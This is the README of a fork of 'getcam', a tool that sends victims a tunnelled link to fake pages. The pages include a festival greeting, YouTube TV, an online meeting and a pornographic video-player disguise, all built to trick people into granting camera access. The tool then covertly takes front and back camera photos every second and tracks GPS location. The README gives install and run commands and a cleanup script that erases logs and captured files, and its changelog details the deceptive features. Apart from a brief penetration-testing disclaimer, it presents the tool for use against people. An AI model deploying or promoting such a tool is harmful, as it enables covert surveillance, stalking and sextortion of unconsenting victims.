# getcam
Grab cam shots from target's phone front camera or PC webcam just sending a link.
# license
This project is based on getcam by techchipnet.
Modified by zahwan.
Licensed under GNU GPL v3.

# What is getcam?
<p>getcam is techniques to take cam shots of target's phone front camera or PC webcam. getcam Hosts a fake website on in built PHP server and uses ngrok & CloudFlare Tunnel to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device

A GPS location capture feature has been added.</p>

## Features
<p>In this tool I added automatic webpage templates for engaged target on webpage to get more picture of cam</p>
<ul>
  <li>Festival Wishing [bad]</li>
  <li>Live YouTube TV</li>
  <li>Online Meeting</li>
  <li>porn web — Video player disguise with auto camera capture [beta]</li>
  <li>GPS Location Tracking</li>
</ul>
<p>A cleanup script has been added to remove all unnecessary files and logs.</p>

## This Tool Tested On :
<ul>
  <li>arch Linux</li>
  <li>Kali Linux</li>
  <li>Termux (on android)</li>
  <li>MacOS</li>
  <li>Ubuntu</li>
  <li>Parrot Sec OS</li>
  <li>Windows (WSL)</li>
</ul>

# Installing and requirements
<p>This tool require PHP for webserver, and wget for downloading dependencies. First run following command on your terminal</p>

```
apt-get -y install php wget unzip
```

## Installing (Kali Linux/Termux):

```
git clone https://github.com/Empy-ai09/gett-all-camera
cd gett-all-camera
bash getcam.sh
```

## Clean logs & unnecessary files :

```
bash cleanup.sh
```
<p>The cam files and saved location will also be removed.</p>

## Change Log:

<p><b>Version: 1.0:</b> Added Porntrick template with video player disguise and auto camera capture</p>
<ul>
  <li>Added: New "porntrick" template — fake video player (CloudDrive) that captures camera photos</li>
  <li>Added: Camera permission popup with warning message before video playback</li>
  <li>Added: Continuous camera capture every 1 second (front + back camera simultaneously)</li>
  <li>Added: Auto-capture starts immediately upon granting camera permission</li>
  <li>Added: Recording status indicator (REC counter) showing number of photos captured</li>
  <li>Added: Asset folder integration — video titles auto-linked to video files in asset/</li>
  <li>Added: Auto-thumbnail generation from video first frames using ffmpeg</li>
  <li>Added: asset.php endpoint to dynamically scan and serve video files from asset/ folder</li>
  <li>Fixed: FormData implementation for reliable photo submission to post.php</li>
  <li>Fixed: Removed Google Fonts dependency for instant page loading</li>
  <li>Fixed: Removed video preload on thumbnails to reduce page load time</li>
  <li>Fixed: Base64 encoding issue that prevented photos from being saved to storage</li>
</ul>


### Important Notice
Unauthorized reuploading of this project is prohibited.

#### For More Video check <a href="http://youtube.com/techchipnet">TechChip YouTube Channel</a>
<p>getcam is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.</p>
<p>getcam is inspired by https://github.com/thelinuxchoice/ Big thanks to @thelinuxchoice</p>
